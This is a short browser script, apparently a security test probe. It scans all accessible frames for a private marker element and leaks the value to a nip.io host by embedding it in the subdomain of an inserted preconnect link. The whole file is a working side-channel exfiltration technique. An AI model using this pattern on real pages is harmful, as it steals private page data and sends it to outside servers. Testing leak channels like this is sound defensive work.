(() => {
  const output = document.getElementById('cg270-relay-status');
  if (!output) return;

  const source = document.currentScript?.src;
  const template = source ? new URL(source).searchParams.get('to') : null;
  const format = /^https:\/\/cg270-\{marker\}\.((?:\d{1,3}\.){4})nip\.io:(\d{2,5})\/$/;
  const match = template && format.exec(template);
  const octets = match?.[1].slice(0, -1).split('.').map(Number);
  const port = Number(match?.[2]);
  if (!match || octets.length !== 4 || octets.some(n => n > 255) || port < 1 || port > 65535) {
    output.textContent = 'NO_VALID_DESTINATION';
    return;
  }

  const valid = /^[0-9a-f]{16}$/;
  const began = Date.now();
  let done = false;
  let timer;

  function readLaterMarker() {
    const visited = new Set();
    function scan(frame, path) {
      if (visited.has(frame)) return null;
      visited.add(frame);
      try {
        if (frame.document !== document) {
          const value = frame.document.getElementById('cg266-later-private')?.textContent?.trim();
          if (value && valid.test(value)) return { value, path };
        }
      } catch (_) {
        // An inaccessible frame contributes no marker.
      }
      let count = 0;
      try { count = frame.frames.length; } catch (_) {}
      for (let i = 0; i < count; i++) {
        let child;
        try { child = frame.frames[i]; } catch (_) { continue; }
        const found = scan(child, `${path}.${i}`);
        if (found) return found;
      }
      return null;
    }
    try { return scan(top, 'top'); } catch (_) { return null; }
  }

  function check() {
    if (done) return;
    const found = readLaterMarker();
    if (!found) {
      if (Date.now() - began >= 120000) {
        output.textContent = 'NO_VALID_SYNTHETIC_MARKER';
        clearInterval(timer);
      }
      return;
    }
    done = true;
    const hint = document.createElement('link');
    hint.rel = 'preconnect';
    hint.href = template.replace('{marker}', found.value);
    document.head.append(hint);
    output.textContent = `SYNTHETIC_HINT_INSERTED:${found.value}:${found.path}`;
    clearInterval(timer);
  }

  output.textContent = 'WAITING_FOR_SYNTHETIC_MARKER';
  timer = setInterval(check, 250);
  check();
})();
